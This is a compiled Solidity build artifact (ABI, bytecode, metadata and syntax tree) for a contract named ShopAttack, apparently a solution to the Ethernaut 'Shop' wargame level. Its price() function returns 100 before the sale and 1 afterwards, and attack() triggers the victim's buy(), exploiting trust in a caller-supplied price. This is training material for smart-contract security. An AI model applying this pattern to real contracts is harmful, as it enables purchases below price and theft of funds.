{"abi":[{"type":"function","name":"attack","inputs":[{"name":"_victim","type":"address","internalType":"contract Shop"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"price","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561000f575f80fd5b506101d88061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063a035b1fe14610038578063d018db3e14610052575b5f80fd5b610040610067565b60405190815260200160405180910390f35b610065610060366004610149565b6100eb565b005b5f3373ffffffffffffffffffffffffffffffffffffffff1663e852e7416040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100b1573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100d59190610183565b6100e05760646100e3565b60015b60ff16905090565b8073ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610130575f80fd5b505af1158015610142573d5f803e3d5ffd5b5050505050565b5f60208284031215610159575f80fd5b813573ffffffffffffffffffffffffffffffffffffffff8116811461017c575f80fd5b9392505050565b5f60208284031215610193575f80fd5b8151801515811461017c575f80fdfea2646970667358221220a137900409926bb12dd4ec83bbc8fde2edd00c2fc096f48d2bafea503df9ca1464736f6c63430008180033","sourceMap":"88:217:56:-:0;;;;;;;;;;;;;;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063a035b1fe14610038578063d018db3e14610052575b5f80fd5b610040610067565b60405190815260200160405180910390f35b610065610060366004610149565b6100eb565b005b5f3373ffffffffffffffffffffffffffffffffffffffff1663e852e7416040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100b1573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100d59190610183565b6100e05760646100e3565b60015b60ff16905090565b8073ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610130575f80fd5b505af1158015610142573d5f803e3d5ffd5b5050505050565b5f60208284031215610159575f80fd5b813573ffffffffffffffffffffffffffffffffffffffff8116811461017c575f80fd5b9392505050565b5f60208284031215610193575f80fd5b8151801515811461017c575f80fdfea2646970667358221220a137900409926bb12dd4ec83bbc8fde2edd00c2fc096f48d2bafea503df9ca1464736f6c63430008180033","sourceMap":"88:217:56:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;114:108;;;:::i;:::-;;;160:25:155;;;148:2;133:18;114:108:56;;;;;;;228:75;;;;;;:::i;:::-;;:::i;:::-;;114:108;154:7;185:10;180:23;;;:25;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:35;;212:3;180:35;;;208:1;180:35;173:42;;;;114:108;:::o;228:75::-;282:7;277:17;;;:19;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;228:75;:::o;196:323:155:-;269:6;322:2;310:9;301:7;297:23;293:32;290:52;;;338:1;335;328:12;290:52;377:9;364:23;427:42;420:5;416:54;409:5;406:65;396:93;;485:1;482;475:12;396:93;508:5;196:323;-1:-1:-1;;;196:323:155:o;524:277::-;591:6;644:2;632:9;623:7;619:23;615:32;612:52;;;660:1;657;650:12;612:52;692:9;686:16;745:5;738:13;731:21;724:5;721:32;711:60;;767:1;764;757:12","linkReferences":{}},"methodIdentifiers":{"attack(address)":"d018db3e","price()":"a035b1fe"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.24+commit.e11b9ed9\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract Shop\",\"name\":\"_victim\",\"type\":\"address\"}],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"price\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/attacks/ShopAttack.sol\":\"ShopAttack\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"src/attacks/ShopAttack.sol\":{\"keccak256\":\"0xf2b179a07d508051858d64cefb99084b12abbc8b5e7c6960e288fc0394399c3f\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6814949dcfab56fbb10c65fd8423fe09805292b18421e66c92f2f5bee9db0068\",\"dweb:/ipfs/Qmetff9RnpHx3gpvjW41Vt6WhyCrWS4J4LBB8pdzMrv2Ys\"]},\"src/levels/Shop.sol\":{\"keccak256\":\"0xd500cab3a2923fc2668d4cc3e42ad05c398fe338ba29f3761f5a44f98eb87db0\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://a15d4d221500fb33d4f7f0da5d81f978f755cfc61bb71840063a9f64906c6337\",\"dweb:/ipfs/QmRH8dNjPDvQe8Pbj1HWJqTSJnudrkmBZ9dWKSi7UozRtB\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.24+commit.e11b9ed9"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"contract Shop","name":"_victim","type":"address"}],"stateMutability":"nonpayable","type":"function","name":"attack"},{"inputs":[],"stateMutability":"view","type":"function","name":"price","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/attacks/ShopAttack.sol":"ShopAttack"},"evmVersion":"shanghai","libraries":{}},"sources":{"src/attacks/ShopAttack.sol":{"keccak256":"0xf2b179a07d508051858d64cefb99084b12abbc8b5e7c6960e288fc0394399c3f","urls":["bzz-raw://6814949dcfab56fbb10c65fd8423fe09805292b18421e66c92f2f5bee9db0068","dweb:/ipfs/Qmetff9RnpHx3gpvjW41Vt6WhyCrWS4J4LBB8pdzMrv2Ys"],"license":"MIT"},"src/levels/Shop.sol":{"keccak256":"0xd500cab3a2923fc2668d4cc3e42ad05c398fe338ba29f3761f5a44f98eb87db0","urls":["bzz-raw://a15d4d221500fb33d4f7f0da5d81f978f755cfc61bb71840063a9f64906c6337","dweb:/ipfs/QmRH8dNjPDvQe8Pbj1HWJqTSJnudrkmBZ9dWKSi7UozRtB"],"license":"MIT"}},"version":1},"ast":{"absolutePath":"src/attacks/ShopAttack.sol","id":49805,"exportedSymbols":{"Buyer":[55043],"Shop":[55081],"ShopAttack":[49804]},"nodeType":"SourceUnit","src":"33:273:56","nodes":[{"id":49773,"nodeType":"PragmaDirective","src":"33:23:56","nodes":[],"literals":["solidity","^","0.8",".0"]},{"id":49774,"nodeType":"ImportDirective","src":"58:28:56","nodes":[],"absolutePath":"src/levels/Shop.sol","file":"../levels/Shop.sol","nameLocation":"-1:-1:-1","scope":49805,"sourceUnit":55082,"symbolAliases":[],"unitAlias":""},{"id":49804,"nodeType":"ContractDefinition","src":"88:217:56","nodes":[{"id":49790,"nodeType":"FunctionDefinition","src":"114:108:56","nodes":[],"body":{"id":49789,"nodeType":"Block","src":"163:59:56","nodes":[],"statements":[{"expression":{"condition":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"arguments":[{"expression":{"id":49780,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"185:3:56","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":49781,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"189:6:56","memberName":"sender","nodeType":"MemberAccess","src":"185:10:56","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":49779,"name":"Shop","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":55081,"src":"180:4:56","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Shop_$55081_$","typeString":"type(contract Shop)"}},"id":49782,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"180:16:56","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_Shop_$55081","typeString":"contract Shop"}},"id":49783,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"197:6:56","memberName":"isSold","nodeType":"MemberAccess","referencedDeclaration":55048,"src":"180:23:56","typeDescriptions":{"typeIdentifier":"t_function_external_view$__$returns$_t_bool_$","typeString":"function () view external returns (bool)"}},"id":49784,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"180:25:56","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"hexValue":"313030","id":49786,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"212:3:56","typeDescriptions":{"typeIdentifier":"t_rational_100_by_1","typeString":"int_const 100"},"value":"100"},"id":49787,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"180:35:56","trueExpression":{"hexValue":"31","id":49785,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"208:1:56","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"functionReturnParameters":49778,"id":49788,"nodeType":"Return","src":"173:42:56"}]},"functionSelector":"a035b1fe","implemented":true,"kind":"function","modifiers":[],"name":"price","nameLocation":"123:5:56","parameters":{"id":49775,"nodeType":"ParameterList","parameters":[],"src":"128:2:56"},"returnParameters":{"id":49778,"nodeType":"ParameterList","parameters":[{"constant":false,"id":49777,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":49790,"src":"154:7:56","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":49776,"name":"uint256","nodeType":"ElementaryTypeName","src":"154:7:56","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"153:9:56"},"scope":49804,"stateMutability":"view","virtual":false,"visibility":"external"},{"id":49803,"nodeType":"FunctionDefinition","src":"228:75:56","nodes":[],"body":{"id":49802,"nodeType":"Block","src":"267:36:56","nodes":[],"statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"arguments":[{"id":49797,"name":"_victim","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":49793,"src":"282:7:56","typeDescriptions":{"typeIdentifier":"t_contract$_Shop_$55081","typeString":"contract Shop"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Shop_$55081","typeString":"contract Shop"}],"id":49796,"name":"Shop","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":55081,"src":"277:4:56","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Shop_$55081_$","typeString":"type(contract Shop)"}},"id":49798,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"277:13:56","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_Shop_$55081","typeString":"contract Shop"}},"id":49799,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"291:3:56","memberName":"buy","nodeType":"MemberAccess","referencedDeclaration":55080,"src":"277:17:56","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () external"}},"id":49800,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"277:19:56","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":49801,"nodeType":"ExpressionStatement","src":"277:19:56"}]},"functionSelector":"d018db3e","implemented":true,"kind":"function","modifiers":[],"name":"attack","nameLocation":"237:6:56","parameters":{"id":49794,"nodeType":"ParameterList","parameters":[{"constant":false,"id":49793,"mutability":"mutable","name":"_victim","nameLocation":"249:7:56","nodeType":"VariableDeclaration","scope":49803,"src":"244:12:56","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_contract$_Shop_$55081","typeString":"contract Shop"},"typeName":{"id":49792,"nodeType":"UserDefinedTypeName","pathNode":{"id":49791,"name":"Shop","nameLocations":["244:4:56"],"nodeType":"IdentifierPath","referencedDeclaration":55081,"src":"244:4:56"},"referencedDeclaration":55081,"src":"244:4:56","typeDescriptions":{"typeIdentifier":"t_contract$_Shop_$55081","typeString":"contract Shop"}},"visibility":"internal"}],"src":"243:14:56"},"returnParameters":{"id":49795,"nodeType":"ParameterList","parameters":[],"src":"267:0:56"},"scope":49804,"stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"abstract":false,"baseContracts":[],"canonicalName":"ShopAttack","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"linearizedBaseContracts":[49804],"name":"ShopAttack","nameLocation":"97:10:56","scope":49805,"usedErrors":[],"usedEvents":[]}],"license":"MIT"},"id":56}